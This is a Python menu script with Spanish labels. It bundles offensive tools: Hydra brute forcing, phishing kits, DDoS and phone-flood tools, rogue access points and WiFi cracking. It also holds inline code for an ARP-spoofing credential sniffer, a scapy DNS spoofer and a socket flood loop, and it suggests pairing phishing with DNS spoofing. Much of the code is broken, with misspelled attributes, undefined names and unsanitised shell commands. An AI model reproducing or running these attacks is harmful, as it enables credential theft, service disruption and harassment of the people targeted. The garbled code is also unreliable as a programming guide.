from pip import main
from pip._internal import main
from scapy import *
import scapy.all as scapy
from scapy.layers import http
import socket
import threading
import subprocess
import os 
import socket
import random 
import time
from subprocess import Popen
from subprocess import call
import requests, os, sys, tempfile, subprocess, base64, time
import os
import signal
import matplotlib.pyplot as plt
import csv 
import matplotlib.ticker as ticker
import speedtest
import datetime
import re
import sys
import webbrowser
#https://www.youtube.com/watch?v=5-IRImDXjjc EN EL MINUTO 2:21:59 (spoofer snifeer
log = ""
def VPN():
    __author__ = "nil"
    __copyright__ = "nil"
    __license__ = "nil"
    __version__ = "nil"
    __maintainer__ = "nil"
    __email__ = "nil"


    if len(sys.argv) != 2:
        print('usage: ' + sys.argv[0] + ' [country name | country code]')
        exit(1)
    country = sys.argv[1]

    if len(country) == 2:
        i = 6 # short name for country
    elif len(country) > 2:
        i = 5 # long name for country
    else:
        print('Country is too short!')
        exit(1)
    
    try:
        vpn_data = requests.get('http://www.vpngate.net/api/iphone/').text.replace('\r','')
        servers = [line.split(',') for line in vpn_data.split('\n')]
        labels = servers[1]
        labels[0] = labels[0][1:]
        servers = [s for s in servers[2:] if len(s) > 1]
    except:
        print('Cannot get VPN servers data')
        exit(1)
    
    desired = [s for s in servers if country.lower() in s[i].lower()]
    found = len(desired)
    print('Found ' + str(found) + ' servers for country ' + country)
    if found == 0:
        exit(1)
    
    supported = [s for s in desired if len(s[-1]) > 0]
    print(str(len(supported)) + ' of these servers support OpenVPN')
    # We pick the best servers by score
    winner = sorted(supported, key=lambda s: float(s[2].replace(',','.')), reverse=True)[0]
    print ("\n== Best server ==")
    pairs = zip(labels, winner)[:-1]
    for (l, d) in pairs[:4]:
        print(l + ': ' + d)

    print(pairs[4][0] + ': ' + str(float(pairs[4][1]) / 10**6) + ' MBps')
    print("Country: " + pairs[5][1])
    
    print ("\nLaunching VPN...")
    _, path = tempfile.mkstemp()

    f = open(path, 'w')
    f.write(base64.b64decode(winner[-1]))
    f.write('\nscript-security 2\nup /etc/openvpn/update-resolv-conf\ndown /etc/openvpn/update-resolv-conf')
    f.close()

    x = subprocess.Popen(['sudo', 'openvpn', '--config', path])

    try:
        while True:
            time.sleep(600)
    # termination with Ctrl+C
    except:
        try:
            x.kill()
        except:
            pass
    while x.poll() != 0:
        time.sleep(1)
    print ('\nVPN terminated')

def bruteforce():
    print("sudo hydra -l [user] -P [location wordlist] [IP] [method]")
    print("methods:telnet,http,https,ssh,FTP,SMTP[25],IMAP")
    print("wordlist:9e89fe_eada3f79027240d38184dd68f8efa476.txt")
    print("type without sudo hydra")
    command = input (">>>")
    os.system("sudo hydra "+command+ "")

def localflood():
    print("asegurese de que la carpeta contenga los archivos html para el texto")
    print("seguido de esto utilice el comando [CD] para entrar en la carpeta")
    print("por ultimo inserte el comando [python -m http.server --bind localhost --cgi [puerto normalmente 8080 o 8081]")


def fastMeterpreter():
    print("1--> Download")
    print("2--> Execute")
    down = input("1 or 2:")
    if down == "1":
        os.system("sudo apt install metasploit-framwerk gnome-terminal python3 python3-pip nc")
        os.system("mv fastMeterpreter2/ * ")
        os.system("pip install -r requirements.txt")
    if down == "2":
        os.system("sudo python3 fastMeterpreter2.py")

def wifispeed():
    print("1--> Monitoreo grafico")
    print("2--> Monitoreo en consola")
    monitoreo = input("1 or 2:")
    if monitoreo == "1":
        times = []
        download = []
        upload = []
        with open('test.csv', 'r') as csvfile:
            plots = csv.reader(csvfile, delimiter=',')
            next(csvfile)
            for row in plots:
              times.append(str(row[0]))
              download.append(float(row[1]))
              upload.append(float(row[2]))
        print(times, "\n", download, "\n", upload)
        plt.figure('speedtest', [30, 30])
        plt.plot(times, download, label='download', color='r')
        plt.plot(times, upload, label='upload', color='b')
        plt.xlabel('time')
        plt.ylabel('speed in Mb/s')
        plt.title("internet speed")
        plt.legend()
        plt.savefig('test_graph.jpg', bbox_inches='tight')
    if monitoreo == "2":
         s = speedtest.Speedtest()
         while True:
             time = datetime.datetime.now().strftime("%H:%M:%S")
             downspeed = round((round(s.download()) / 1048576), 2)
             upspeed = round((round(s.upload()) / 1048576), 2)
             print(f"time: {time}, downspeed: {downspeed} Mb/s, upspeed: {upspeed} Mb/s")

def passwordspeed():
    Hashcat = input("Do you have Hashcat installed?(Y or N):")
    if Hashcat == "Y":
        os.system("sudo apt-get install hashcat")
    if hashcat == "N":
        os.system("sudo hashcat -b")
def goodkiller():
    print("1 -->>> download ")
    print("2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":
        os.system("https://github.com/FDX100/GOD-KILLER")
        os.system("mv GOD-KILLER/ *")
        os.system("sudo python3 install.py")
    if input == "2":
        os.system("GOD-KILLER")
def phoneinfoga():
    print("1 -->>> download ")
    print(" 2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":
        os.system("git clone https://github.com/sundowndev/PhoneInfoga")
        os.system("mv PhoneInfoga/ *")
        os.system("sudo python3 -m pip install -r requirements.txt --user")
        os.system("sudo wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz")
        os.system("sudo tar xvfz geckodriver-v0.24.0-linux64.tar.gz")
        os.system("sudo chmod +x geckodriver")
        os.system("sudo export PATH=$PATH:/ruta-extraida/")
        os.system("docker pull sundowndev/phoneinfoga:latest")
        os.system("docker run --rm -it sundowndev/phoneinfoga --help")
    if input == "2":
        print("EJ:(+51) 927742190")
        phone = input("tlfn phone with the (+)>>>")
        os.system("python3 phoneinfoga.py -n "+phone+"")
def BTCanalizer():
    print("1 -->>> download ")
    print(" 2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":
        os.system("git clone https://github.com/s4vitar/btcAnalyzer")
        os.system("mv btcAnalyzer/ *")
        os.system("sudo apt-get install html2text bc -y")
    if input == "2":
        print("-n transacciones totales")
        print("-i identificador de la transaccion")
        print("-a especificar la adress")
        print("EJ: -e adress -a XXXXXXXXXXXXXXXXXX")
        what = input("command:")
        os.system("sudo ./btcAnalyzer" +what+ "")

def wifiCrack():
    print(" 1 -->> Download")
    print(" 2 -->> Execute")
    input = input("1,2>>>")
    if input == "1":
        os.system("git clone https://github.com/s4vitar/wifiCrack")
    if input == "2":
        os.system("sudo ./s4iPwnWifi.sh")

def TPLINK():
    print("1 -->>> download ")
    print(" 2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":    
        print("Wait a second...")
        time.sleep(4)
        os.system("git clone https://github.com/vk496/linset")
        os.system("mv Linset/* .")
        os.system("chmod +x linset")
    if input == "2":
        os.system("./linset")
def Ddoswifi():
    print("1 -->>> download ")
    print(" 2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":
        os.system("git clone https://github.com/palahsu/DDoS-Ripper")
        os.system("mv DDoS-Ripper/ *")
    if input == "2":    
        print("_________________________________")
        print("select de IP and the turbo(100-x/kB of your network")
        print("_________________________________")
        IP = input("IP victim:")
        Port = input("PORT:")
        turbo = input("turbo:")
        os.system("sudo python3 DRipper.py -s "+IP+" -p "+Port+" -t " +turbo+ "")

def Ufonet():
    print("1 -->>> download ")
    print(" 2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":
        os.system("https://github.com/epsylon/ufonet")
        os.system("mv ufonet/ *")
        os.system("sudo python3 setup.py install")
        os.system("sudo apt-get install python3-pycurl python3-geoip python3-whois python3-crypto python3-requests python3-scapy libgeoip1 libgeoip-dev")
    if input == "2":
        os.system("sudo python3 ./ufonet --gui ")
        time.sleep(5)
        webbrowser.open_new_tab("http://127.0.0.1:9999")
def Phishing():
    customweb = input("Do you want to take a custom web?(Y or N):")
    if customweb == "Y":
        URL = input("Enter the custom URL:")
        os.system("wget "+URL+"")
        print("downloading eviltrust...")
        time.sleep(2)
        os.system("git clone https://github.com/s4vitar/evilTrust")
        os.system("mv evilTrust/ *")
        os.system("sudo bash evilTrust.sh")
    if customweb == "N":
        os.system("git clone https://github.com/htr-tech/zphisher")
        os.system("mv zphisher/ *")
        os.system("sudo bash zphisher.sh")

def checkSPY():
    print("1 -->>> download ")
    print(" 2 -->> Execute")
    input = input("1 or 2:")
    if input == "1":
        os.system("https://github.com/mvt-project/mvt")
    if input == "2":
        Print("Recuerde conectar el telefono VIA USB")
        print("Tambien Recuerde leer de arriba hacia abajo")
        print("Android or IOS?")
        sistem = input(">>>")
        if sistem == "Android":
            os.system("mvt-android check-adb")
            os.system("mvt-android check-backup")
            os.system("mvt-android check-bugreport")
            os.system("mvt-android check-iocs")
            print("Do you want to install The APK of MVT?")
            nstall = input("Y or N?:")
            if ntall == "Y":
                os.system("mvt-android download-apks")
            if ntall == "N":
                print("press ctrl+C to exit")
                time.sleep(1000000000000)
        if sistem == "IOS":
            os.system("mvt-ios check-backup")
            os.system("mvt-ios check-fs")
            os.system("mvt-ios check-iocs")
            print("Do you want to install the Public Indicator?")
            niostall = input("Y or N:")
            if niostall == "Y":
                os.system("mvt-ios download-iocs")
                print("Ctrl+C to exit")
                time.sleep(100000000000000)
            if niostall == "N":
                print("Ctrl+C to exit")
                time.sleep(100000000000000)
def sniffer():
    os.system("iptables -I FORWARD -k NFQUEUE --queue-num 0")
    os.system("python arp_spoofer.py")
    def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

    def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequesst].Path

    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ["username" , "user" , "login" , "password" , "pass"]
                for keyword in keywords:
                    if keyword in load:
                        return load 
    def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPREQUEST].Host + packet[http.HTTPREQUEST].path
            print(url)
            print("[+] HTTP Request >>>" + url)

            login_info = get_login_info(packet)
            if login_info:
                print("\n\n[+] Usuario y Contraseña Posibles >"+ login_Info + "\n\n")

    sniff("eth0")
def DNSspoofer():
    dev = "enp3s0f1"
    filter = "udp port 53"
    file = None
    dns_map = {}

    def handle_packet(packet):
        ip = packet.getlayer(scapy.IP)
        udp = packet.getlayer(scapy.UDP)
        dns = packet.getlayer(scapy.DNS)

       # standard (a record) dns query
        if dns.qr == 0 and dns.opcode == 0:
            queried_host = dns.qd.qname[:-1].decode()
            resolved_ip = None

            if dns_map.get(queried_host):
                resolved_ip = dns_map.get(queried_host)
            elif dns_map.get('*'):
                resolved_ip = dns_map.get('*')

            if resolved_ip:
                dns_answer = scapy.DNSRR(rrname=queried_host + ".",
                                         ttl=330,
                                         type="A",
                                         rclass="IN",
                                     rdata=resolved_ip)

                dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
                            scapy.UDP(sport=udp.dport,
                                      dport=udp.sport) / \
                            scapy.DNS(
                                id = dns.id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = dns.qd,
                                an = dns_answer
                            )

                print("Send %s has %s to %s" % (queried_host,
                                                resolved_ip,
                                                ip.src))
                scapy.send(dns_reply, iface=dev)


    def usage():
        print(sys.argv[0] + " -f <hosts-file> -i <dev>")
        sys.exit(1)


    def parse_host_file(file):
        for line in open(file):
            line = line.rstrip('\n')

            if line:
                (ip, host) = line.split()
                dns_map[host] = ip

    try:
        cmd_opts = "f:i:"
        opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
    except getopt.GetoptError:
        usage()

    for opt in opts:
        if opt[0] == "-i":
            dev = opt[1]
        elif opt[0] == "-f":
            file = opt[1]
        else:
            usage()

    if file:
        parse_host_file(file)
    else:
        usage()

    print("Spoofing DNS requests on %s" % (dev))
    scapy.sniff(iface=dev, filter=filter, prn=handle_packet)
def DDOS():
    ip = input("IP:")
    port = input("PUERTO:")
    hilos = input("Nº hilos>")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendto(('GET /' + ip + ' HTTP/1.1\r\n').encode('ascii', (ip, port)))
         

    for _ in range(hilos):
        thread = threading.Thread(target=attack)
        thread.start()
def changeMAC():
    mac = getmacbyip("10.0.0.1")
    print("your actually MAC:" +mac+ "")
    print("Example of MAC>6F:72:8X:79:66:4E")
    MAC = input ("enter new MAC:")
    subprocess.call("ifconfig eth0 down", shell=True)
    subprocess.call("ifconfig eth0 hw ether" +MAC+ "", shell=True)
    subprocess.call("ifconfig eth0 up", shell=True)
#___________________________________________________________________________________________
def ChangeIP():    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print("YOUR IP:"+s.getsockname()[0]+"")
    time.sleep(2)
    print("Installing IP changer...")
    webbrowser.open("https://www.wagnardsoft.com/IPC/download/IPC%20v1.3.2.0.exe")
#___________________________________________________________________________________________
def WPSattack():
    print(" TPLINK -->> 1")
    print(" Ddos  -->> 2")
    print(" Linset(Rogue AP) -->> 3")
    tool = input("?:")
    if tool == "1":
        TPLINK()
    if tool == "2":
        Ddoswifi()
    if tool == "3":
        Linset()
    if tool == "4":
        WifiCrack()



print("DNSpoofer -->> remplaza un DNS haciendo que salga otra web")
print("Godkiller -->> Floodea a un numero de telefono por linea directa y manda mensajes customizados")
print("phoneinfoga -->> Saca la informacion de un numero de telefono")
print("password speed -->> Check the password crack speed with Sha,MD5,NTLM,LM.etc")
print("BTC -->> Visuiona las transacciones recientes y el saldo de una billetera BTC")
print("Sniffer -->> captura los datos de las señales HTTP y recoge la contraseña junto al usuario")
print(" WPS -->> Ataques a diferentes redes wifi")
print("Ufonet -->> ataque Dos o Ddos a una IP con distintos protocolos")
print("Ddos -->> un simple ataque distribuido")
print(" Phishing -->> Un ataque phisher que puede ser juntado con el DNS spoofer ")
print("checkSpyware --> Detecta los software maliciosos como por ejemplo PEGASUS")
print("changeIP -->> cambia tu direccion IP pubica con una VPN")
print("Wifi speed -->> Monitorea la velocidad wifi(puede sertvir para comprobar la tasa de flood)")
print("Localflood -->> floodea un wifi creando localhosts en diversos puertos")
print("MAC -->> Cambia la mac del dispositivo, asi haciendolo indetectable")


input = input(">")
if input == "DNSpoofer":
    DNSspoofer()
if input == "goodkiller":
    goodkiller()
if input == "bruteforce":
    bruteforce()
if input == "Wifi Speed":
    wifispeed()
if input == "phoneinfoga":
    phoneinfoga()
if input == "password speed":
    passwordspeed()
if input == "BTC":
    BTCanalizer()
if input == "sniffer":
    sniffer()
if input == "DDos":
    DDOS()
if input == "Phisher":
    Phishing()
if input == "Localflood":
    localflood()
if input == "Ufonet":
    Ufonet()
if input == "checkSpyware":
    checkSPY()
if input == "changeMAC":
    changeMAC()
if input == "changeIP":
    VPN()
if input == "WPS":
    WPSattack()

